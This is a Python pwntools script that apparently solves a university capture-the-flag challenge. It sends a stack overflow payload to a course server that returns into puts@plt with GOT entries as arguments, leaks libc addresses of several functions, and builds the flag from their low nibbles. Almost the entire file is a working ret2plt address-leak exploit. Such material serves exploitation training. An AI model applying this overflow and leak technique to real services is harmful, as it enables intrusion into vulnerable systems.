#!/usr/bin/python3
from pwn import *

def setup_connection(server_address, port_number):
    return remote(server_address, port_number)

def construct_payload(function_address, vuln_address, got_address):
    payload = b"A" * 20
    payload += p32(function_address)
    payload += p32(vuln_address)
    payload += p32(got_address)
    return payload

def send_payload_and_receive_response(connection, payload):
    connection.sendline(payload)
    response = connection.recvline().strip()
    while response == b"good luck!" or len(response) < 4:
        response = connection.recvline().strip()
    return response

def extract_address(response):
    leak = u32(response[:4])
    return hex(leak & 0xFFF)[2:]

def get_flag_format(addresses):
    return "CSCE604258{" + "_".join(addresses) + "}"

if __name__ == "__main__":
    server_address = "ctf99.cs.ui.ac.id"
    port_number = 10014

    context.binary = ELF("chall")
    elf = context.binary

    connection = setup_connection(server_address, port_number)

    function_names = ["puts", "gets", "__libc_start_main"]
    flag_addresses = ["000"]  # the last 3 nibbles of setvbuf, hardcoded because it is not returned

    for function_name in function_names:
        log.info(f"Getting {function_name} address {hex(elf.got[function_name])}")

        payload = construct_payload(elf.plt.puts, elf.sym.vuln, elf.got[function_name])
        response = send_payload_and_receive_response(connection, payload)
        flag_addresses.append(extract_address(response))

    flag = get_flag_format(flag_addresses)
    print(flag)